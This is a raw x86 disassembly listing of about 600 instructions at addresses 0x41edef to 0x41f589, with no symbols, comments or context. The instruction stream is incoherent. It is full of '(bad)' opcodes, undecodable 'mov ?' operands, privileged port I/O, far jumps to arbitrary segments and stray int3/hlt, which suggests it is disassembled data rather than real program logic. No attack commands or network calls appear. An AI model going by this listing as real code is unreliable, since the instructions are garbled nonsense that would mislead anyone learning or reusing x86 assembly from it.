  41edef:	scas   al,BYTE PTR es:[di]
  41edf1:	inc    esp
  41edf2:	fwait
  41edf3:	pop    ebx
  41edf4:	fdecstp 
  41edf6:	jg     0x41ee0a
  41edf8:	mov    DWORD PTR ds:0x5f709b46,ebp
  41edfe:	call   DWORD PTR ds:0xcbb095b4
  41ee04:	loopne 0x41eded
  41ee06:	dec    ecx
  41ee07:	arpl   WORD PTR [edx+0x75],si
  41ee0a:	les    eax,FWORD PTR [eax+0x1bbaef58]
  41ee10:	mov    edi,0x686d7b1c
  41ee15:	rol    BYTE PTR fs:[edx+0x6090b638],cl
  41ee1c:	out    0x18,eax
  41ee1e:	pop    eax
  41ee1f:	call   0x4ceb:0x96d58121
  41ee26:	fsubp  st(5),st
  41ee28:	adc    ecx,DWORD PTR [ebp-0x226113e3]
  41ee2e:	inc    edx
  41ee2f:	loop   0x41eddf
  41ee31:	sbb    DWORD PTR [edx+0x12e6e716],0x53eab1ff
  41ee3b:	pop    ds
  41ee3c:	mov    ah,0xcf
  41ee3e:	push   cs
  41ee3f:	adc    ecx,0x3101ce50
  41ee45:	sub    DWORD PTR [ebx],ecx
  41ee47:	fsub   st(0),st
  41ee49:	fs push ds
  41ee4b:	retf   
  41ee4c:	mov    bl,0x89
  41ee4e:	sub    edi,DWORD PTR [edx+edx*1-0x6e]
  41ee52:	push   0x41
  41ee54:	pushf  
  41ee55:	push   edx
  41ee56:	and    cl,cl
  41ee58:	mov    dh,0x2d
  41ee5a:	xor    esp,eax
  41ee5c:	jo     0x41eeba
  41ee5e:	jmp    0xce68010b
  41ee63:	dec    ebx
  41ee64:	in     eax,0xab
  41ee66:	mov    ecx,0x5d567a0d
  41ee6b:	repnz popfw 
  41ee6e:	loop   0x41ee90
  41ee70:	stos   BYTE PTR es:[edi],al
  41ee71:	in     eax,dx
  41ee72:	mov    esi,0x204cb227
  41ee77:	lods   eax,DWORD PTR ds:[esi]
  41ee78:	mov    ch,0x1b
  41ee7a:	pop    edx
  41ee7b:	or     edi,DWORD PTR [bx+di]
  41ee7e:	nop
  41ee7f:	pop    esp
  41ee80:	or     DWORD PTR [eax+0x60],esp
  41ee83:	(bad)  
  41ee84:	mov    bl,0xf5
  41ee86:	ss dec ebx
  41ee88:	mov    dh,0x5d
  41ee8a:	(bad)  
  41ee8b:	sbb    BYTE PTR [ebp-0x64],dh
  41ee8e:	xor    dh,bh
  41ee90:	lods   eax,DWORD PTR ds:[esi]
  41ee91:	lods   al,BYTE PTR ds:[esi]
  41ee92:	adc    al,0xa8
  41ee94:	lea    edi,[edx-0x7e]
  41ee97:	leave  
  41ee98:	in     eax,dx
  41ee99:	icebp  
  41ee9a:	jmp    0x8171efe0
  41ee9f:	fstp   DWORD PTR [edx]
  41eea1:	inc    esp
  41eea2:	loopne 0x41ef21
  41eea4:	add    BYTE PTR [ebx+0x32],al
  41eea7:	cmp    al,0x86
  41eea9:	mov    cl,0xf7
  41eeab:	sbb    dh,BYTE PTR [ecx+edx*2]
  41eeae:	out    dx,eax
  41eeaf:	enter  0x4c56,0x86
  41eeb3:	in     eax,0x47
  41eeb5:	xchg   edi,eax
  41eeb6:	das    
  41eeb7:	cmp    BYTE PTR [edi+0x14],cl
  41eeba:	pop    eax
  41eebb:	jb     0x41ef39
  41eebd:	add    ah,BYTE PTR [esi]
  41eebf:	pusha  
  41eec0:	dec    edx
  41eec1:	mov    ds:0x5201ca69,eax
  41eec6:	enter  0x37b5,0x37
  41eeca:	mov    cs,WORD PTR [esi]
  41eecc:	rcr    eax,1
  41eece:	add    al,0x96
  41eed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eed1:	xor    al,0x4f
  41eed3:	mov    ebp,ecx
  41eed5:	addr16 xor ecx,esp
  41eed8:	and    esp,DWORD PTR [ecx+0x443f369b]
  41eede:	jge    0x41ee7f
  41eee0:	(bad)  [eax+0x6ae64890]
  41eee6:	cmp    BYTE PTR [ebx+ebx*8],cl
  41eee9:	das    
  41eeea:	push   0x1cf9c534
  41eeef:	jmp    0x31e2:0x7e3a0a5b
  41eef6:	sub    eax,0x7c98a296
  41eefb:	repnz fcmovnb st,st(1)
  41eefe:	fcomp  DWORD PTR [edx-0x7e]
  41ef01:	popa   
  41ef02:	xor    BYTE PTR [ebx-0x25],cl
  41ef05:	cdq    
  41ef06:	jo     0x41eeee
  41ef08:	mov    BYTE PTR [ebx+0x4bc5d05f],bl
  41ef0e:	fidiv  WORD PTR [edx-0x1bf25eea]
  41ef14:	inc    esi
  41ef15:	mov    dh,0xb9
  41ef17:	pop    eax
  41ef18:	jno    0x41ef84
  41ef1a:	lods   eax,DWORD PTR ds:[esi]
  41ef1b:	pop    ds
  41ef1c:	mov    ebp,0x85b904f9
  41ef21:	add    DWORD PTR [ebx-0x34],ebp
  41ef24:	push   es
  41ef25:	mov    edx,0x35c568b5
  41ef2a:	mov    ch,0xc2
  41ef2c:	pop    edi
  41ef2d:	mov    edi,0xe19da370
  41ef32:	push   eax
  41ef33:	jbe    0x41eeda
  41ef35:	ins    DWORD PTR es:[edi],dx
  41ef36:	mov    ecx,0x31b60013
  41ef3b:	bound  eax,QWORD PTR [ebx+0x1a]
  41ef3e:	loop   0x41eeca
  41ef40:	daa    
  41ef41:	lock xchg dh,ch
  41ef44:	lahf   
  41ef45:	mov    dh,0x37
  41ef47:	sar    esi,1
  41ef49:	je     0x41eedb
  41ef4b:	mov    eax,0x32272c5d
  41ef50:	rcr    ebp,cl
  41ef52:	aaa    
  41ef53:	sar    BYTE PTR [edi+0x7e],1
  41ef56:	dec    eax
  41ef57:	leave  
  41ef58:	jno    0x41efb0
  41ef5a:	int3   
  41ef5b:	jmp    0x3d78011e
  41ef60:	fst    QWORD PTR [edi+0x796e8b3c]
  41ef66:	push   es
  41ef67:	xchg   al,ah
  41ef69:	push   eax
  41ef6a:	add    bl,BYTE PTR [eax+ebp*2]
  41ef6d:	dec    ebx
  41ef6e:	mov    eax,ds:0xb466d969
  41ef73:	xor    bl,dl
  41ef75:	imul   esp,DWORD PTR [ebp-0x4838addd],0x6f922ef2
  41ef7f:	sbb    ebp,0xffffffff
  41ef82:	loopne 0x41efd8
  41ef84:	ss js  0x41ef73
  41ef87:	pop    ebp
  41ef88:	mov    ss,WORD PTR [esi-0x60]
  41ef8b:	lahf   
  41ef8c:	repz fcmovnu st,st(7)
  41ef8f:	add    ebx,ecx
  41ef91:	mov    edi,0x774700f7
  41ef97:	int3   
  41ef98:	add    esp,ebp
  41ef9a:	sbb    bh,ch
  41ef9c:	xor    eax,0x392bf725
  41efa1:	arpl   cx,di
  41efa3:	jl     0x41efef
  41efa5:	adc    al,0x70
  41efa7:	sar    DWORD PTR [edi+eax*2],cl
  41efaa:	int3   
  41efab:	and    esp,DWORD PTR [ecx-0x15]
  41efae:	push   ebp
  41efaf:	cwde   
  41efb0:	pop    edx
  41efb1:	out    0x9f,al
  41efb3:	xor    DWORD PTR [eax+0x71370d9a],ebx
  41efb9:	(bad)  
  41efba:	pusha  
  41efbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efbc:	mov    eax,DWORD PTR [ecx-0xe1db9a]
  41efc2:	jmp    0x6335:0x4f7a1e10
  41efc9:	sub    ebp,DWORD PTR [ebx+0x38]
  41efcc:	pop    edx
  41efcd:	out    dx,eax
  41efce:	aad    0x46
  41efd0:	fisttp QWORD PTR [edx]
  41efd2:	mul    DWORD PTR [ebp-0x220d460f]
  41efd8:	retf   0xd756
  41efdb:	nop
  41efdc:	push   0xffffffa2
  41efde:	cs out dx,eax
  41efe0:	adc    dh,cl
  41efe2:	lea    ebp,[edi+0x5ffd0567]
  41efe8:	pop    edx
  41efe9:	in     al,0x40
  41efeb:	in     al,dx
  41efec:	mov    ebp,0x575916f2
  41eff1:	lahf   
  41eff2:	lock lods eax,DWORD PTR ds:[esi]
  41eff4:	dec    ecx
  41eff5:	lahf   
  41eff6:	adc    edx,ebp
  41eff8:	jp     0x41f03b
  41effa:	idiv   DWORD PTR [ecx+0x59]
  41effd:	fild   DWORD PTR [esi+0xd9a1132]
  41f003:	or     ebp,DWORD PTR [esi]
  41f005:	mov    ecx,DWORD PTR [edi+0x79]
  41f008:	sub    cl,ah
  41f00a:	add    DWORD PTR [edx],edi
  41f00c:	loop   0x41f064
  41f00e:	ret    0x663c
  41f011:	les    esp,FWORD PTR [ebx+0x6b]
  41f014:	and    BYTE PTR [edi-0x4a775732],bl
  41f01a:	or     DWORD PTR [edi],eax
  41f01c:	les    edi,FWORD PTR [ecx]
  41f01e:	sar    DWORD PTR [ecx],0x97
  41f021:	and    esp,0x54
  41f024:	out    0x3,al
  41f026:	imul   edi,DWORD PTR [ecx],0xc4c7728b
  41f02c:	retf   
  41f02d:	add    DWORD PTR ds:0xf9965d88,0xffffff98
  41f034:	mov    ch,0xda
  41f036:	test   eax,0x1a312f22
  41f03b:	pushf  
  41f03c:	add    dh,dl
  41f03e:	cli    
  41f03f:	sub    bl,BYTE PTR [esi-0x6f902433]
  41f045:	and    DWORD PTR [edi-0x298add84],edx
  41f04b:	clc    
  41f04c:	cmc    
  41f04d:	jg     0x41f006
  41f04f:	jne    0x41f087
  41f051:	lds    esi,FWORD PTR [eax+ecx*2-0x27]
  41f055:	loope  0x41f02b
  41f057:	push   ebx
  41f058:	adc    ah,BYTE PTR [ebp-0x2e2d64b8]
  41f05e:	xchg   edi,eax
  41f05f:	pop    es
  41f060:	sbb    DWORD PTR [edi+0x2138ff5c],edx
  41f066:	mov    al,0x1d
  41f068:	xchg   DWORD PTR [esi+eiz*8],ebx
  41f06b:	mov    bh,0x7f
  41f06d:	inc    ecx
  41f06e:	add    DWORD PTR [ecx+0xa],edx
  41f071:	rcr    BYTE PTR [ebp+edi*2+0x577524fa],0xf8
  41f079:	inc    eax
  41f07a:	jns    0x41f0b0
  41f07c:	lahf   
  41f07d:	aam    0x54
  41f07f:	jl     0x41f01a
  41f081:	jmp    0xdb394580
  41f086:	xlat   BYTE PTR ds:[ebx]
  41f087:	xchg   bp,ax
  41f089:	shl    BYTE PTR [edx],1
  41f08b:	push   ds
  41f08c:	mov    ebx,0x8bbb9557
  41f091:	xor    dh,bl
  41f093:	pop    eax
  41f094:	ret    0xcb46
  41f097:	push   eax
  41f098:	popf   
  41f099:	lods   eax,DWORD PTR ds:[esi]
  41f09a:	(bad)  
  41f09b:	cmp    ecx,DWORD PTR [ebx-0x57]
  41f09e:	int    0xef
  41f0a0:	fld    TBYTE PTR [edx-0x7950d61c]
  41f0a6:	mov    ds:0xd9b49866,eax
  41f0ab:	xchg   ebp,eax
  41f0ac:	popf   
  41f0ad:	pop    edi
  41f0ae:	xchg   BYTE PTR [esi],ch
  41f0b0:	or     cl,BYTE PTR [edi-0x67b2d2a8]
  41f0b6:	addr16 repz push ss
  41f0b9:	or     eax,0xd3f4093c
  41f0be:	loope  0x41f099
  41f0c0:	inc    ebx
  41f0c1:	xchg   esi,eax
  41f0c2:	dec    esi
  41f0c3:	outs   dx,BYTE PTR ds:[esi]
  41f0c4:	fs sahf 
  41f0c6:	mov    ebp,ecx
  41f0c8:	xor    ecx,edi
  41f0ca:	add    edi,edx
  41f0cc:	fwait
  41f0cd:	push   0xffffffdd
  41f0cf:	fdiv   DWORD PTR [edx+0x6ffe841]
  41f0d5:	pop    es
  41f0d6:	lods   eax,DWORD PTR ds:[esi]
  41f0d7:	or     al,0x46
  41f0d9:	jmp    0x82cc:0xfbddd37
  41f0e0:	pusha  
  41f0e1:	or     BYTE PTR [eax-0x2],dh
  41f0e4:	mov    ch,0x35
  41f0e6:	shr    DWORD PTR [edx-0x76fa4702],cl
  41f0ec:	in     eax,0x6
  41f0ee:	dec    ebx
  41f0ef:	(bad)  
  41f0f0:	xor    eax,0x90dd3676
  41f0f5:	out    0x83,al
  41f0f7:	movntq QWORD PTR [eax-0x4e],mm7
  41f0fb:	fadd   st(3),st
  41f0fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0fe:	sbb    eax,0x9262cc58
  41f103:	fistp  WORD PTR [eax+0x30f6a0d4]
  41f109:	mov    edx,gs
  41f10b:	in     eax,dx
  41f10c:	add    BYTE PTR [edx],ah
  41f10e:	pop    edx
  41f10f:	not    BYTE PTR [edi-0x7b]
  41f112:	imul   eax,DWORD PTR ds:0x728091f6,0xb8911719
  41f11c:	outs   dx,BYTE PTR ds:[esi]
  41f11d:	jecxz  0x41f0a1
  41f11f:	(bad)  
  41f120:	outs   dx,DWORD PTR ds:[esi]
  41f121:	into   
  41f122:	push   0x26
  41f124:	mov    dl,0x76
  41f126:	mov    esi,0xcf857173
  41f12b:	or     al,0xa5
  41f12d:	fist   WORD PTR [eax]
  41f12f:	pushf  
  41f130:	mov    esi,0x2e8d49b2
  41f135:	pop    esi
  41f136:	ds cs mov bl,0x5d
  41f13a:	xchg   esi,eax
  41f13b:	es sbb al,dl
  41f13e:	outs   dx,BYTE PTR gs:[esi]
  41f140:	push   esi
  41f141:	test   eax,0x51cd6a0e
  41f146:	iret   
  41f147:	aas    
  41f148:	fisttp QWORD PTR [ebx-0x5680f14e]
  41f14e:	mov    gs,ebx
  41f150:	mov    edx,0xef0ffc12
  41f155:	jnp    0x41f1ae
  41f157:	xor    BYTE PTR [esi-0x4f47e75],0x2b
  41f15e:	es mov bh,0x98
  41f161:	addr16 loope 0x41f132
  41f164:	push   ebx
  41f165:	mov    cl,0x65
  41f167:	dec    ebx
  41f168:	ret    0x1f99
  41f16b:	mov    al,0x5f
  41f16d:	cwde   
  41f16e:	fs jmp 0x532c:0xce0b9927
  41f176:	sbb    eax,0x7c3bc531
  41f17b:	sbb    al,BYTE PTR [eax+0x7d]
  41f17e:	fidivr WORD PTR [ebx-0x70]
  41f181:	dec    eax
  41f182:	das    
  41f183:	push   0x60f086f0
  41f188:	mov    eax,ds:0x8fc21068
  41f18d:	push   ds
  41f18e:	popa   
  41f18f:	xlat   BYTE PTR ds:[ebx]
  41f190:	inc    ebx
  41f191:	cld    
  41f192:	in     al,0x89
  41f194:	in     eax,dx
  41f195:	int3   
  41f196:	ins    BYTE PTR es:[edi],dx
  41f197:	add    BYTE PTR [eax+0x5e],dl
  41f19a:	stos   DWORD PTR es:[edi],eax
  41f19b:	ret    0xdb11
  41f19e:	js     0x41f134
  41f1a0:	push   es
  41f1a1:	jae    0x41f169
  41f1a3:	ss push edi
  41f1a5:	fstp   QWORD PTR ds:0xdc2ad634
  41f1ab:	shl    DWORD PTR [eax],0x37
  41f1ae:	mov    esp,0x38b3982e
  41f1b3:	(bad)  
  41f1b4:	cmp    al,0xb9
  41f1b6:	shl    DWORD PTR [edi+0x4ea3ce2e],cl
  41f1bc:	fiadd  WORD PTR [ebp+0x4e]
  41f1bf:	and    al,0x35
  41f1c1:	out    dx,al
  41f1c2:	sti    
  41f1c3:	cli    
  41f1c4:	or     DWORD PTR [eax],ecx
  41f1c6:	inc    ebp
  41f1c7:	imul   edx,DWORD PTR [ecx+edx*2+0x7e91dd67],0x54
  41f1cf:	jle    0x41f176
  41f1d1:	mov    ds:0x7e1a4a45,eax
  41f1d6:	gs popa 
  41f1d8:	push   0x43
  41f1da:	push   cs
  41f1db:	arpl   bp,ax
  41f1dd:	leave  
  41f1de:	out    dx,al
  41f1df:	lods   al,BYTE PTR ds:[esi]
  41f1e0:	fwait
  41f1e1:	add    eax,0x746a34f5
  41f1e6:	pop    ds
  41f1e7:	cmc    
  41f1e8:	std    
  41f1e9:	mov    edx,0x160805c0
  41f1ee:	jb     0x41f19c
  41f1f0:	jge    0x41f182
  41f1f2:	xchg   edx,eax
  41f1f3:	mov    ds:0x151caa95,al
  41f1f8:	and    al,0x42
  41f1fa:	add    al,BYTE PTR [ecx-0x19]
  41f1fd:	pop    ebx
  41f1fe:	mov    al,0x72
  41f200:	xchg   ebx,eax
  41f201:	(bad)  
  41f202:	mov    eax,0xa19203cd
  41f207:	dec    esp
  41f208:	cmp    DWORD PTR [ebx+0x4335486a],ebp
  41f20e:	mov    ebp,0x70fa9d1
  41f213:	mov    dh,0xda
  41f215:	fst    DWORD PTR [edx+eax*4+0xd19f4e4]
  41f21c:	dec    ecx
  41f21d:	add    al,0x97
  41f21f:	sub    al,0xe5
  41f221:	pop    eax
  41f222:	push   0x52
  41f224:	in     al,0x10
  41f226:	das    
  41f227:	inc    edi
  41f228:	les    edx,FWORD PTR [ebp-0x5a71bf3f]
  41f22e:	aaa    
  41f22f:	rcl    dh,1
  41f231:	rol    BYTE PTR [ebx],1
  41f233:	div    BYTE PTR [ebx-0x4c]
  41f236:	repnz and al,0x85
  41f239:	adc    eax,0x729b2370
  41f23e:	mov    cl,0x21
  41f240:	pop    ecx
  41f241:	cmp    cl,dh
  41f243:	inc    edx
  41f244:	jo     0x41f260
  41f246:	push   cs
  41f247:	popf   
  41f248:	pop    ss
  41f249:	mov    dl,0xc9
  41f24b:	pop    eax
  41f24c:	push   0xffffffcd
  41f24e:	sub    eax,0x50899460
  41f253:	(bad)  
  41f254:	mov    ah,0xb1
  41f256:	xor    esi,ebx
  41f258:	jl     0x41f241
  41f25a:	jl     0x41f23c
  41f25c:	int3   
  41f25d:	int3   
  41f25e:	xchg   ebx,eax
  41f25f:	or     DWORD PTR [ebx-0x10887147],esp
  41f265:	cmp    eax,0x1f158cbc
  41f26a:	hlt    
  41f26b:	pop    ds
  41f26c:	jecxz  0x41f220
  41f26e:	push   edi
  41f26f:	cdq    
  41f270:	cmp    esi,esp
  41f272:	(bad)  
  41f273:	loopne 0x41f246
  41f275:	sub    BYTE PTR [edx-0x1f],ch
  41f278:	aaa    
  41f279:	stc    
  41f27a:	arpl   WORD PTR [edi-0x1],si
  41f27d:	mov    eax,ds:0x86866f9
  41f282:	ja     0x41f263
  41f284:	in     al,dx
  41f285:	xlat   BYTE PTR ds:[ebx]
  41f286:	inc    esp
  41f287:	into   
  41f288:	test   BYTE PTR [ebx+0x25],bl
  41f28b:	mov    ecx,0xbcae2b4e
  41f290:	sub    BYTE PTR [ebp+0x49],al
  41f293:	and    al,0x6f
  41f295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f296:	cmp    eax,0x549129ed
  41f29b:	cmc    
  41f29c:	popa   
  41f29d:	loope  0x41f23e
  41f29f:	dec    eax
  41f2a0:	push   ebp
  41f2a1:	retf   
  41f2a2:	ror    DWORD PTR [eax-0x74c17855],cl
  41f2a8:	les    ecx,FWORD PTR [ebp+0x29]
  41f2ab:	or     dh,bh
  41f2ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ae:	icebp  
  41f2af:	push   ebx
  41f2b0:	xor    ch,bl
  41f2b2:	outs   dx,DWORD PTR ds:[esi]
  41f2b3:	aaa    
  41f2b4:	test   DWORD PTR [ecx],edi
  41f2b6:	mov    ecx,0x6d6443ab
  41f2bb:	xchg   ebx,eax
  41f2bc:	sti    
  41f2bd:	push   cs
  41f2be:	das    
  41f2bf:	sbb    eax,0x9cedcb2f
  41f2c4:	rcl    DWORD PTR [ecx],0x66
  41f2c7:	fbld   TBYTE PTR [ebp-0x72]
  41f2ca:	xchg   BYTE PTR [esi+0x3c],cl
  41f2cd:	push   ds
  41f2ce:	mov    bh,0x1d
  41f2d0:	ror    cl,cl
  41f2d2:	xchg   ebp,eax
  41f2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d4:	das    
  41f2d5:	call   0x6cc8:0x21522ca2
  41f2dc:	inc    edi
  41f2dd:	cmp    edi,DWORD PTR [ecx]
  41f2df:	les    ecx,FWORD PTR [esi+ecx*8]
  41f2e2:	sub    al,BYTE PTR [edi]
  41f2e4:	or     dh,0xd4
  41f2e7:	cmp    BYTE PTR [ebx+0x6],0x64
  41f2eb:	jo     0x41f308
  41f2ed:	ss xchg dh,ch
  41f2f0:	inc    edx
  41f2f1:	push   ss
  41f2f2:	popa   
  41f2f3:	adc    cl,BYTE PTR [ebp-0x14]
  41f2f6:	sbb    ebx,esp
  41f2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2f9:	lods   eax,DWORD PTR ds:[esi]
  41f2fa:	mov    ah,0x75
  41f2fc:	aas    
  41f2fd:	(bad)  
  41f2fe:	repz sbb ebx,DWORD PTR [edx+ebp*4+0x5ec86b9a]
  41f306:	mov    eax,ds:0xc47f1468
  41f30b:	push   ebx
  41f30c:	mov    esi,0x5a9b8f8c
  41f311:	repnz dec ebx
  41f313:	sub    eax,0xaf972317
  41f318:	sti    
  41f319:	push   ds
  41f31a:	psrld  mm0,QWORD PTR [ebx-0x46]
  41f31e:	and    eax,0xfc472522
  41f323:	arpl   WORD PTR [esi],ax
  41f325:	mov    eax,ds:0x1c560200
  41f32a:	xchg   esp,eax
  41f32b:	icebp  
  41f32c:	mov    al,ds:0xccc706d6
  41f331:	and    eax,0xf82d4169
  41f336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f337:	mov    ecx,0x605a45ff
  41f33c:	inc    esp
  41f33d:	add    ah,BYTE PTR [edi+0x0]
  41f340:	xchg   ebp,eax
  41f341:	mov    al,0xc3
  41f343:	clc    
  41f344:	mov    eax,ds:0xb155b06a
  41f349:	sub    dl,BYTE PTR [esi-0x1d00b612]
  41f34f:	in     al,dx
  41f350:	cmp    esi,ecx
  41f352:	push   cs
  41f353:	lea    ecx,[esi+0x72]
  41f356:	nop
  41f357:	adc    esi,DWORD PTR [edi+0x33]
  41f35a:	push   eax
  41f35b:	add    DWORD PTR [edx+0x32],ebp
  41f35e:	cmp    DWORD PTR [ebx+0x62067655],ecx
  41f364:	or     BYTE PTR [esi-0x2bf20c1],ch
  41f36a:	mov    ecx,0x6b901246
  41f36f:	pop    edx
  41f370:	cmp    esi,esp
  41f372:	cs pushf 
  41f374:	xor    al,0x26
  41f376:	sahf   
  41f377:	shl    BYTE PTR [edi],cl
  41f379:	jbe    0x41f33b
  41f37b:	cli    
  41f37c:	loope  0x41f322
  41f37e:	(bad)
  41f381:	iret   
  41f382:	add    ah,dh
  41f384:	ret    0x3eae
  41f387:	ins    BYTE PTR es:[edi],dx
  41f388:	sbb    eax,0x50d8e182
  41f38d:	dec    ecx
  41f38e:	jb     0x41f3ab
  41f390:	mov    esi,DWORD PTR [edi-0xe]
  41f393:	dec    edx
  41f394:	adc    esp,DWORD PTR [ecx-0x6]
  41f397:	stc    
  41f398:	dec    eax
  41f399:	inc    esi
  41f39a:	sti    
  41f39b:	xor    BYTE PTR [esi-0x35],ch
  41f39e:	jecxz  0x41f3ef
  41f3a0:	mov    ch,0x8
  41f3a2:	mov    ebp,0x3f4216f1
  41f3a7:	test   al,0x69
  41f3a9:	hlt    
  41f3aa:	pop    ds
  41f3ab:	push   edx
  41f3ac:	aam    0xfe
  41f3ae:	dec    edi
  41f3af:	mov    ecx,0x9780b2d4
  41f3b4:	enter  0x7f29,0xf7
  41f3b8:	popf   
  41f3b9:	jb     0x41f357
  41f3bb:	dec    edx
  41f3bc:	jmp    0x41f3cf
  41f3be:	mov    bh,ch
  41f3c0:	shl    DWORD PTR [ebp+0x5dfc90d0],1
  41f3c6:	add    ebp,DWORD PTR [edi]
  41f3c8:	sbb    BYTE PTR [ecx],ch
  41f3ca:	popf   
  41f3cb:	in     al,dx
  41f3cc:	(bad)  
  41f3cd:	mov    ch,0x64
  41f3cf:	iret   
  41f3d0:	fisubr DWORD PTR [ebx+edi*4+0x79eb4a3c]
  41f3d7:	and    BYTE PTR [edi-0x30],bh
  41f3da:	and    al,0xa6
  41f3dc:	fisttp QWORD PTR [edx+0x7a2d8350]
  41f3e2:	cmp    eax,0x3781b54d
  41f3e7:	imul   esi,DWORD PTR [esi+0x15d0a032],0x7c432663
  41f3f1:	sbb    DWORD PTR [edi-0x1e34069f],edx
  41f3f7:	dec    esp
  41f3f8:	scas   al,BYTE PTR es:[edi]
  41f3f9:	pop    ecx
  41f3fa:	call   0x5dba:0x541c35ca
  41f401:	idiv   BYTE PTR [ebp+0x12ad6cb9]
  41f407:	mov    bh,0xdd
  41f409:	adc    BYTE PTR [ebx+0x72],bh
  41f40c:	pusha  
  41f40d:	stc    
  41f40e:	push   0x4ec677d9
  41f413:	adc    edx,DWORD PTR [edi-0x5c16b3c8]
  41f419:	push   DWORD PTR [edx]
  41f41b:	push   eax
  41f41c:	daa    
  41f41d:	imul   edx,DWORD PTR [ecx],0x9
  41f420:	in     al,dx
  41f421:	push   esp
  41f422:	sbb    BYTE PTR [ecx-0x44feae40],0x20
  41f429:	xor    esp,DWORD PTR [ebp+0x222ec51]
  41f42f:	fwait
  41f430:	nop
  41f431:	retf   0x8bec
  41f434:	mov    edi,0x8d75d7fc
  41f439:	inc    esi
  41f43a:	mov    bl,0xd4
  41f43c:	xor    ebp,DWORD PTR [edi+0x35]
  41f43f:	enter  0x402d,0x89
  41f443:	adc    DWORD PTR [edi],ebp
  41f445:	inc    esp
  41f446:	test   dl,dl
  41f448:	sbb    BYTE PTR [edx],bh
  41f44a:	cs mov ch,0x95
  41f44d:	in     eax,0x8d
  41f44f:	sub    al,0xd
  41f451:	dec    edi
  41f452:	cmp    dl,BYTE PTR [ebx]
  41f454:	test   BYTE PTR [eax+0x5db98571],dh
  41f45a:	xchg   DWORD PTR [ebx+eiz*8],ebx
  41f45d:	adc    DWORD PTR [ebp+0x7a],esp
  41f460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f461:	rol    edi,cl
  41f463:	push   esp
  41f464:	xchg   ecx,eax
  41f465:	repnz inc ebp
  41f467:	add    al,0x64
  41f469:	mov    BYTE PTR [edi-0x3d013934],al
  41f46f:	sbb    DWORD PTR [esp+edi*2-0x60],edx
  41f473:	hlt    
  41f474:	addr16 fsubrp st(7),st
  41f477:	div    DWORD PTR [ecx+ecx*8-0x62]
  41f47b:	push   esp
  41f47c:	add    esi,DWORD PTR [esi-0x53dbd7ac]
  41f482:	outs   dx,BYTE PTR ds:[esi]
  41f484:	fwait
  41f485:	lods   eax,DWORD PTR ds:[esi]
  41f486:	out    dx,al
  41f487:	pop    ebx
  41f488:	pushf  
  41f489:	xor    ecx,ebp
  41f48b:	es mov edi,gs
  41f48e:	in     eax,0x98
  41f490:	int3   
  41f491:	outs   dx,DWORD PTR ds:[esi]
  41f492:	(bad)  
  41f493:	jmp    0x5ee58a23
  41f498:	cmp    BYTE PTR [ecx],dl
  41f49a:	(bad)  
  41f49b:	fild   WORD PTR [edx+0x64b51e4d]
  41f4a1:	inc    ebx
  41f4a2:	bnd call 0x5fe2418e
  41f4a8:	mov    esp,0x758a084d
  41f4ad:	mul    DWORD PTR [ecx-0x6f]
  41f4b0:	jmp    0x820a:0x112ed1a6
  41f4b7:	loopne 0x41f4d5
  41f4b9:	(bad)
  41f4bc:	cmp    ah,bh
  41f4be:	int3   
  41f4bf:	mov    ?,edx
  41f4c1:	sti    
  41f4c2:	fdivr  DWORD PTR [edx+0x311a163f]
  41f4c8:	xor    al,al
  41f4ca:	inc    eax
  41f4cb:	fild   DWORD PTR [ecx+0x66cb48fe]
  41f4d1:	popf   
  41f4d2:	sbb    DWORD PTR [edi],ebx
  41f4d4:	fs mov al,0x25
  41f4d7:	mov    ebx,0xfeb8dada
  41f4dc:	retf   0xcaac
  41f4df:	inc    esp
  41f4e0:	iret   
  41f4e1:	test   eax,0x59a66322
  41f4e6:	ret    0x38cb
  41f4e9:	aas    
  41f4ea:	fdivr  DWORD PTR [eax+ebp*1-0x2a9cce7e]
  41f4f1:	jmp    0x2edad7b1
  41f4f6:	mov    ah,0x7c
  41f4f8:	(bad)
  41f4fc:	out    dx,al
  41f4fd:	xchg   ecx,eax
  41f4fe:	ins    DWORD PTR es:[edi],dx
  41f4ff:	dec    eax
  41f500:	mov    ebx,0xd969fa05
  41f505:	cmovne edx,DWORD PTR [ecx]
  41f508:	std    
  41f509:	dec    ebx
  41f50a:	jecxz  0x41f509
  41f50c:	loop   0x41f4ec
  41f50e:	test   DWORD PTR [edx-0x29],0x833335f0
  41f515:	adc    DWORD PTR [esp+eiz*2-0x3c],esp
  41f519:	cmp    DWORD PTR [ebx+0x52e7ae6f],0x20266f48
  41f523:	dec    edi
  41f524:	or     DWORD PTR [ecx-0x3a],edi
  41f527:	inc    ebx
  41f528:	jbe    0x41f4ca
  41f52a:	adc    DWORD PTR [edx],ecx
  41f52c:	sbb    DWORD PTR [edx-0x39155b59],esp
  41f532:	pushf  
  41f533:	add    DWORD PTR [edi],0x3ea3f1e2
  41f539:	sahf   
  41f53a:	pop    ecx
  41f53b:	xor    BYTE PTR [esi+0x3f91531b],al
  41f541:	ret    0x5d3
  41f544:	mov    ds:0x15792389,eax
  41f549:	mov    ecx,0x38f8a7b5
  41f54e:	mov    ?,WORD PTR [ebp-0x76]
  41f551:	cli    
  41f552:	sahf   
  41f553:	sub    edx,esi
  41f555:	jbe    0x41f5a6
  41f557:	sbb    DWORD PTR [edi-0x69e7b274],esp
  41f55d:	sbb    BYTE PTR [ecx],dl
  41f55f:	sbb    BYTE PTR [ebp+0x1d],al
  41f562:	call   0x78b6:0x3e702b71
  41f569:	dec    ah
  41f56b:	hlt    
  41f56c:	stc    
  41f56d:	je     0x41f54e
  41f56f:	xchg   DWORD PTR [edx-0x51bde599],esi
  41f575:	sbb    bl,BYTE PTR [ecx-0x4f]
  41f578:	jae    0x41f581
  41f57a:	jb     0x41f5ed
  41f57c:	adc    bl,BYTE PTR [ecx]
  41f57e:	stos   DWORD PTR es:[edi],eax
  41f57f:	push   esp
  41f580:	sbb    edx,DWORD PTR [ecx-0x5c]
  41f583:	inc    edx
  41f584:	or     eax,0x32f21cac
  41f589:	mov    DWORD PTR [eax+ebx*8],0x29e8ff75
